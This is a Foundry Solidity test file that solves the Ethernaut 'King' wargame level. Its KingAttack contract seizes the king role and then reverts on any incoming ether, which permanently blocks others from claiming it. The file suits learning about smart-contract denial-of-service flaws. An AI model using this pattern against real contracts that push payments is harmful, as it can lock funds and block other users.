// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {King} from "src/levels/King.sol";
import {KingFactory} from "src/levels/KingFactory.sol";
// import {KingAttack} from "src/attacks/KingAttack.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestKingSolution is Test, Utils {
    Ethernaut ethernaut;
    King instance;
    KingAttack kingAttack;

    address payable owner;
    address payable player;
    address payable player2;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(3);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        player2 = users[2];
        vm.label(player2, "Player2");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        KingFactory factory = new KingFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = King(
            payable(
                createLevelInstance(
                    ethernaut,
                    Level(address(factory)),
                    0.001 ether
                )
            )
        );
        kingAttack = new KingAttack();
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        // goal: make anyone not be able to claim king role

        // the expected is any user being able to be the king by just sending
        // the prize amount of eth, however this sends the eth to the last king befor updating
        // a king can be a contract and just revert on their receive(), so when the execution tries to send
        // eth back to the king address(our contract), it will just revert and completely DoS.

        vm.startPrank(player);
        // @note this should be cached otherwhise it will expect revert from instance instead of .call
        uint256 _prize = instance.prize();

        // claim king by using kingAttack contract
        kingAttack.attack{value: _prize}(address(instance));
        assertTrue(instance._king() == address(kingAttack));
        vm.stopPrank();

        // other player should be not able to claim their throne
        vm.startPrank(player2);
        // https://getfoundry.sh/reference/cheatcodes/expect-revert#description
        vm.expectRevert("try next time");
        // just ca
        (bool a, bytes memory b) = payable(instance).call{value: _prize}("");

        // check that king is still KingAttack contract
        assertTrue(instance._king() == address(kingAttack));

        vm.stopPrank();
    }
}

contract KingAttack {
    // send eth to King contract to claim king role
    function attack(address _instance) external payable returns (address king) {
        address(_instance).call{value: msg.value}("");
    }
    // revert when receiving eth, this will make our DoS happen
    receive() external payable {
        require(false, "try next time");
    }
}
